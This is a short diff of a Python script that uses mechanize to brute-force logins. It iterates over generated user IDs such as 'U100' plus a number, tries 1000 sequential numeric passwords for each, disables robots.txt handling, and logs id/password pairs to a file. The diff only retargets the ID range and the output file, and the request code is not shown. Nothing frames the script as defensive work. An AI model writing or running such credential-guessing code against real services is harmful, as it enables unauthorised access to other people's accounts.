@@ -5,7 +5,7 @@ import mechanize
 
 
 def file(id, pass1):
-	f = open("rsetpass.txt", "a")
+	f = open("rsetpass10.txt", "a")
 	line = id + ", " + pass1 + "\n"
 	f.write(line)
 	f.close()
@@ -14,9 +14,9 @@ def file(id, pass1):
 def getdata():
 	prev = 0
 	startpass = 2000
-	startid = 3114
+	startid = 3000
 	for i in xrange(startid, startid + 1):#00):
-		id = "U110" + str(i)
+		id = "U100" + str(i)
 		for j in xrange(startpass, startpass + 1000):
 			browser = mechanize.Browser(factory=mechanize.RobustFactory())
 			browser.set_handle_robots(False)
